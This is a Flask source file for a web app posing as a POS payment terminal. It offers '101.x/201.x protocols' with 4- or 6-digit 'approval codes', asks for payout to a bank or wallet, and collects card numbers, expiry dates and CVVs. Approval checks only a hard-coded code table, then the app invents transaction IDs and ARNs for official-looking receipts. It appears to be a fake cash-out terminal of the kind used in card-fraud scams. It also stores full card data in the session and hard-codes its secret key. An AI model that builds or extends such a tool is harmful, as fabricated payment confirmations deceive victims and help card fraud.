from flask import Flask, render_template, request, redirect, session, url_for
import random
import logging
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'fds_secret_key_8583'
logging.basicConfig(level=logging.INFO)

DUMMY_CARDS = {
    "4114755393849011": {"expiry": "0926", "cvv": "363", "auth": "1942", "type": "POS-101.1"},
    "4000123412341234": {"expiry": "1126", "cvv": "123", "auth": "4021", "type": "POS-101.1"},
    "4117459374038454": {"expiry": "1026", "cvv": "258", "auth": "384726", "type": "POS-101.4"},
    "4123456789012345": {"expiry": "0826", "cvv": "852", "auth": "495128", "type": "POS-101.4"},
    "5454957994741066": {"expiry": "1126", "cvv": "746", "auth": "627192", "type": "POS-101.6"},
    "5432987643987643": {"expiry": "0726", "cvv": "447", "auth": "729134", "type": "POS-101.6"},
    "6011000990131077": {"expiry": "0825", "cvv": "330", "auth": "8765", "type": "POS-101.7"},
    "6011123456789010": {"expiry": "0626", "cvv": "112", "auth": "5612", "type": "POS-101.7"},
    "3782822463101088": {"expiry": "1226", "cvv": "1059", "auth": "0000", "type": "POS-101.8"},
    "3714496353984310": {"expiry": "0326", "cvv": "3030", "auth": "0000", "type": "POS-101.8"},
    "3530760473041099": {"expiry": "0326", "cvv": "244", "auth": "712398", "type": "POS-201.1"},
    "3528000700000000": {"expiry": "0226", "cvv": "209", "auth": "888123", "type": "POS-201.1"},
    "2223000048401013": {"expiry": "0726", "cvv": "009", "auth": "939113", "type": "POS-201.3"},
    "2223000012345678": {"expiry": "0626", "cvv": "531", "auth": "112358", "type": "POS-201.3"},
    "5105937493749735": {"expiry": "0426", "cvv": "416", "auth": "558877", "type": "POS-201.5"},
    "5100123456789010": {"expiry": "0926", "cvv": "411", "auth": "123321", "type": "POS-201.5"},
}

PROTOCOLS = {
    "POS Terminal -101.1 (4-digit approval)": 4,
    "POS Terminal -101.4 (6-digit approval)": 6,
    "POS Terminal -101.6 (Pre-authorization)": 6,
    "POS Terminal -101.7 (4-digit approval)": 4,
    "POS Terminal -101.8 (PIN-LESS transaction)": 4,
    "POS Terminal -201.1 (6-digit approval)": 6,
    "POS Terminal -201.3 (6-digit approval)": 6,
    "POS Terminal -201.5 (6-digit approval)": 6
}

FIELD_39_RESPONSES = {
    "05": "Do Not Honor - Issuer Declined",
    "14": "Invalid Card Number - No Match Found",
    "54": "Expired Card - Date Mismatch",
    "82": "CVV Validation Failed",
    "91": "Issuer or Switch Inoperative",
}

@app.route('/')
def home():
    session.clear()
    return redirect(url_for('protocol'))

@app.route('/protocol', methods=['GET', 'POST'])
def protocol():
    if request.method == 'POST':
        selected = request.form.get('protocol')
        if selected not in PROTOCOLS:
            return redirect(url_for('rejected', code="92", reason="INVALID TERMINAL PROTOCOL"))
        session['protocol'] = selected
        session['code_length'] = PROTOCOLS[selected]
        return redirect(url_for('amount'))
    return render_template('protocol.html', protocols=PROTOCOLS.keys())

@app.route('/amount', methods=['GET', 'POST'])
def amount():
    if request.method == 'POST':
        session['amount'] = request.form.get('amount')
        return redirect(url_for('payout'))
    return render_template('amount.html')

@app.route('/payout', methods=['GET', 'POST'])
def payout():
    if request.method == 'POST':
        session['payout_type'] = request.form['method']
        if session['payout_type'] == 'BANK':
            session['bank'] = request.form['bank']
            session['account'] = request.form['account']
        else:
            session['wallet'] = request.form['wallet']
        return redirect(url_for('card'))
    return render_template('payout.html')

@app.route('/card', methods=['GET', 'POST'])
def card():
    if request.method == 'POST':
        pan = request.form['pan'].replace(" ", "")
        exp = request.form['expiry'].replace("/", "")
        cvv = request.form['cvv']

        session.update({'pan': pan, 'exp': exp, 'cvv': cvv})
        card = DUMMY_CARDS.get(pan)

        if card:
            if exp != card['expiry']:
                return redirect(url_for('rejected', code="54", reason=FIELD_39_RESPONSES["54"]))
            if cvv != card['cvv']:
                return redirect(url_for('rejected', code="82", reason=FIELD_39_RESPONSES["82"]))

        return redirect(url_for('auth'))

    return render_template('card.html')

@app.route('/auth', methods=['GET', 'POST'])
def auth():
    pan = session.get('pan')
    card = DUMMY_CARDS.get(pan)
    expected_length = session.get('code_length', 6)

    if request.method == 'POST':
        code = request.form.get('auth')

        if not card:
            logging.warning(f"[AUTH] Unknown card used: {pan}")
            return redirect(url_for('rejected', code="14", reason=FIELD_39_RESPONSES["14"]))

        if len(code) != expected_length:
            return render_template('auth.html', warning=f"Code must be {expected_length} digits.")

        if card['auth'] == code:
            txn_id = f"TXN{random.randint(100000, 999999)}"
            arn = f"ARN{random.randint(100000000000, 999999999999)}"
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            field39 = "00"

            session.update({
                "txn_id": txn_id,
                "arn": arn,
                "timestamp": timestamp,
                "field39": field39
            })
            logging.info(f"[AUTH] APPROVED: Card {pan[-4:]} - TXN_ID: {txn_id} ARN: {arn}")
            return redirect(url_for('success'))

        logging.warning(f"[AUTH] DENIED: Incorrect approval code for card {pan[-4:]}")
        return redirect(url_for('rejected', code="05", reason=FIELD_39_RESPONSES["05"]))

    return render_template('auth.html')

@app.route('/success')
def success():
    return render_template('success.html',
        txn_id=session.get("txn_id"),
        arn=session.get("arn"),
        pan=session.get("pan", "")[-4:],
        amount=session.get("amount"),
        timestamp=session.get("timestamp")
    )

@app.route('/receipt')
def receipt():
    return render_template('receipt.html',
        txn_id=session.get("txn_id"),
        arn=session.get("arn"),
        pan=session.get("pan", "")[-4:],
        amount=session.get("amount"),
        payout=session.get("payout_type"),
        field39=session.get("field39"),
        timestamp=session.get("timestamp")
    )

@app.route('/rejected')
def rejected():
    return render_template('rejected.html',
        code=request.args.get("code"),
        reason=request.args.get("reason", "Transaction Declined")
    )

@app.route('/offline')
def offline():
    return render_template('offline.html')

if __name__ == '__main__':
    app.run(debug=True)

